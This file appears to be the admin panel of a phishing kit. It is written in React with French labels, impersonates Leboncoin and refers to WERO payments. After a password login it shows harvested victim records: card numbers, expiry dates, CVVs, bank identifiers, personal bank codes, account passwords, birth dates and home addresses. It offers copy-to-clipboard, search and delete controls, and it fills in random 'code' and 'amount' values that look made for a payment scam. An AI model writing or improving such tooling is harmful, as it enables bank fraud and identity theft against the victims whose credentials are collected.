
import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { User, FileText, Trash2, LogOut, Copy, Edit } from "lucide-react";
import { getAllUsersData, deleteUserByEmail, checkAdminPassword } from "@/utils/sessionUtils";
import { cn } from "@/lib/utils";

interface UserData {
  email?: string;
  password?: string;
  nom?: string;
  prenom?: string;
  dateNaissance?: string;
  adresse?: string;
  codePostal?: string;
  ville?: string;
  telephone?: string;
  numeroCarte?: string;
  dateExpiration?: string;
  cryptogramme?: string;
  typeBanque?: string;
  identifiantBancaire?: string;
  codePersonnel?: string;
  montant?: string;
  code?: string;
  derniereMaj?: string;
}

const Admin: React.FC = () => {
  const [isAuthenticated, setIsAuthenticated] = useState<boolean>(false);
  const [password, setPassword] = useState<string>("");
  const [error, setError] = useState<string>("");
  const [usersData, setUsersData] = useState<UserData[]>([]);
  const [expandedUser, setExpandedUser] = useState<string | null>(null);
  const [searchTerm, setSearchTerm] = useState<string>("");
  const navigate = useNavigate();

  useEffect(() => {
    if (isAuthenticated) {
      loadUserData();
    }
  }, [isAuthenticated]);

  const loadUserData = () => {
    const data = getAllUsersData();
    setUsersData(data);
  };

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (checkAdminPassword(password)) {
      setIsAuthenticated(true);
      setError("");
    } else {
      setError("Mot de passe incorrect");
    }
  };

  const handleLogout = () => {
    setIsAuthenticated(false);
    setPassword("");
  };

  const handleDelete = (email: string) => {
    if (window.confirm("Êtes-vous sûr de vouloir supprimer cet utilisateur ?")) {
      deleteUserByEmail(email);
      loadUserData();
    }
  };

  const toggleExpand = (email: string) => {
    if (expandedUser === email) {
      setExpandedUser(null);
    } else {
      setExpandedUser(email);
    }
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    alert("Copié dans le presse-papier !");
  };

  const filteredUsers = usersData.filter(user => {
    const searchFields = [
      user.nom,
      user.prenom,
      user.email,
      user.telephone,
      user.adresse,
      user.ville,
      user.numeroCarte
    ].filter(Boolean).join(" ").toLowerCase();
    
    return searchFields.includes(searchTerm.toLowerCase());
  });

  // Générer un code aléatoire pour l'utilisateur
  const generateRandomCode = () => {
    return `${Math.floor(Math.random() * 26 + 65).toString(36).toUpperCase()}${Math.floor(Math.random() * 26 + 65).toString(36).toUpperCase()}${Math.floor(Math.random() * 10)}-${Math.floor(Math.random() * 10)}${Math.floor(Math.random() * 26 + 65).toString(36).toUpperCase()}${Math.floor(Math.random() * 10)}`;
  };

  // Générer un montant aléatoire pour l'utilisateur
  const generateRandomAmount = () => {
    return `${Math.floor(Math.random() * 300) + 50}€`;
  };

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen flex flex-col bg-gray-100">
        <div className="flex-1 flex items-center justify-center">
          <div className="w-full max-w-md p-8 bg-white rounded-lg shadow-lg">
            <div className="flex justify-center mb-6">
              <img src="/logo.svg" alt="Leboncoin" className="h-10" />
            </div>
            <h1 className="text-2xl font-bold text-center mb-6">Connexion Administrateur</h1>
            
            <form onSubmit={handleLogin} className="space-y-6">
              <div>
                <label htmlFor="password" className="block text-sm font-medium text-gray-700 mb-1">
                  Mot de passe
                </label>
                <input
                  id="password"
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-leboncoin-orange"
                  required
                />
              </div>
              
              {error && (
                <div className="text-red-500 text-sm">{error}</div>
              )}
              
              <button
                type="submit"
                className="w-full py-2 px-4 bg-leboncoin-orange text-white font-semibold rounded-md hover:bg-orange-600 focus:outline-none focus:ring-2 focus:ring-orange-400"
              >
                Se connecter
              </button>
            </form>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex flex-col bg-[#827117]">
      <header className="bg-white p-4 shadow-md">
        <div className="container mx-auto flex justify-between items-center">
          <div className="flex items-center">
            <img src="/logo.svg" alt="Leboncoin" className="h-8 mr-2" />
            <h1 className="text-xl font-bold">Panneau d'administration</h1>
          </div>
          <button
            onClick={handleLogout}
            className="flex items-center gap-2 px-4 py-2 bg-red-500 text-white rounded hover:bg-red-600"
          >
            <LogOut size={16} />
            Déconnexion
          </button>
        </div>
      </header>

      <main className="flex-1 container mx-auto py-6 px-4">
        <div className="bg-gray-200 rounded-lg p-6">
          <div className="flex justify-between items-center mb-6">
            <h2 className="text-2xl font-bold">Données Utilisateurs WERO</h2>
            <div className="flex gap-4">
              <div className="relative">
                <input
                  type="text"
                  placeholder="Rechercher..."
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                  className="pl-10 pr-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-leboncoin-orange"
                />
                <div className="absolute left-3 top-2.5 text-gray-400">
                  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <circle cx="11" cy="11" r="8"></circle>
                    <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
                  </svg>
                </div>
              </div>
              <button className="flex items-center gap-2 px-4 py-2 bg-green-500 text-white rounded hover:bg-green-600">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <line x1="12" y1="5" x2="12" y2="19"></line>
                  <line x1="5" y1="12" x2="19" y2="12"></line>
                </svg>
                Ajouter un utilisateur
              </button>
            </div>
          </div>

          <div className="space-y-6">
            {filteredUsers.length === 0 ? (
              <div className="text-center py-8 text-gray-500">
                Aucun utilisateur trouvé
              </div>
            ) : (
              filteredUsers.map((user, index) => (
                <div key={index} className="bg-white rounded-lg shadow overflow-hidden">
                  <div className="p-4 border-b">
                    <div className="flex justify-between items-start">
                      <div>
                        <h3 className="text-xl font-semibold">
                          {user.nom} {user.prenom}
                        </h3>
                        <div className="text-sm text-gray-600 mt-1">
                          <p>Code: {user.code || generateRandomCode()}</p>
                          <p className="text-green-500 font-medium">Montant: {user.montant || generateRandomAmount()}</p>
                          <p>Téléphone: {user.telephone}</p>
                          <p>Pays: FR</p>
                          <p>Dernière modification: {user.derniereMaj || new Date().toLocaleString('fr-FR')}</p>
                        </div>
                      </div>
                      <div className="flex gap-2">
                        <button 
                          onClick={() => toggleExpand(user.email || '')}
                          className="p-2 bg-blue-100 text-blue-600 rounded hover:bg-blue-200"
                        >
                          <FileText size={16} />
                        </button>
                        <button 
                          onClick={() => handleDelete(user.email || '')}
                          className="p-2 bg-red-100 text-red-600 rounded hover:bg-red-200"
                        >
                          <Trash2 size={16} />
                        </button>
                      </div>
                    </div>
                  </div>

                  {expandedUser === user.email && (
                    <div className="p-4 bg-gray-50">
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                        <div className="space-y-4">
                          <div>
                            <h4 className="flex items-center text-lg font-medium text-gray-800 mb-2">
                              <User size={18} className="mr-2 text-leboncoin-orange" />
                              Informations bancaires
                            </h4>
                            <div className="space-y-2">
                              <div className="flex justify-between text-sm">
                                <span className="text-gray-600">Email:</span>
                                <span className="font-medium flex items-center">
                                  {user.email}
                                  <button 
                                    onClick={() => copyToClipboard(user.email || '')}
                                    className="ml-2 text-blue-500 hover:text-blue-700"
                                  >
                                    <Copy size={14} />
                                  </button>
                                </span>
                              </div>
                              <div className="flex justify-between text-sm">
                                <span className="text-gray-600">Titulaire:</span>
                                <span className="font-medium">{user.nom} {user.prenom}</span>
                              </div>
                              <div className="flex justify-between text-sm">
                                <span className="text-gray-600">Numéro de carte:</span>
                                <span className="font-medium">{user.numeroCarte}</span>
                              </div>
                              <div className="flex justify-between text-sm">
                                <span className="text-gray-600">Expiration:</span>
                                <span className="font-medium">{user.dateExpiration}</span>
                              </div>
                              <div className="flex justify-between text-sm">
                                <span className="text-gray-600">CVV:</span>
                                <span className="font-medium">{user.cryptogramme}</span>
                              </div>
                              <div className="flex justify-between text-sm">
                                <span className="text-gray-600">Type de banque:</span>
                                <span className="font-medium">{user.typeBanque}</span>
                              </div>
                              <div className="flex justify-between text-sm">
                                <span className="text-gray-600">Identifiant bancaire:</span>
                                <span className="font-medium">{user.identifiantBancaire}</span>
                              </div>
                              <div className="flex justify-between text-sm">
                                <span className="text-gray-600">Code personnel:</span>
                                <span className="font-medium">{user.codePersonnel}</span>
                              </div>
                            </div>
                          </div>
                        </div>

                        <div className="space-y-4">
                          <div>
                            <h4 className="flex items-center text-lg font-medium text-gray-800 mb-2">
                              <User size={18} className="mr-2 text-leboncoin-orange" />
                              Informations de connexion
                            </h4>
                            <div className="space-y-2">
                              <div className="flex justify-between text-sm">
                                <span className="text-gray-600">Email:</span>
                                <span className="font-medium">{user.email}</span>
                              </div>
                              <div className="flex justify-between text-sm">
                                <span className="text-gray-600">Mot de passe:</span>
                                <span className="font-medium">{user.password}</span>
                              </div>
                            </div>

                            <h4 className="flex items-center text-lg font-medium text-gray-800 mt-6 mb-2">
                              <User size={18} className="mr-2 text-leboncoin-orange" />
                              Informations personnelles
                            </h4>
                            <div className="space-y-2">
                              <div className="flex justify-between text-sm">
                                <span className="text-gray-600">Nom:</span>
                                <span className="font-medium">{user.nom}</span>
                              </div>
                              <div className="flex justify-between text-sm">
                                <span className="text-gray-600">Prénom:</span>
                                <span className="font-medium">{user.prenom}</span>
                              </div>
                              <div className="flex justify-between text-sm">
                                <span className="text-gray-600">Date de naissance:</span>
                                <span className="font-medium">{user.dateNaissance}</span>
                              </div>
                              <div className="flex justify-between text-sm">
                                <span className="text-gray-600">Adresse:</span>
                                <span className="font-medium">{user.adresse}</span>
                              </div>
                              <div className="flex justify-between text-sm">
                                <span className="text-gray-600">Code postal:</span>
                                <span className="font-medium">{user.codePostal}</span>
                              </div>
                              <div className="flex justify-between text-sm">
                                <span className="text-gray-600">Ville:</span>
                                <span className="font-medium">{user.ville}</span>
                              </div>
                              <div className="flex justify-between text-sm">
                                <span className="text-gray-600">Téléphone:</span>
                                <span className="font-medium">{user.telephone}</span>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  )}
                </div>
              ))
            )}
          </div>
        </div>
      </main>
    </div>
  );
};

export default Admin;
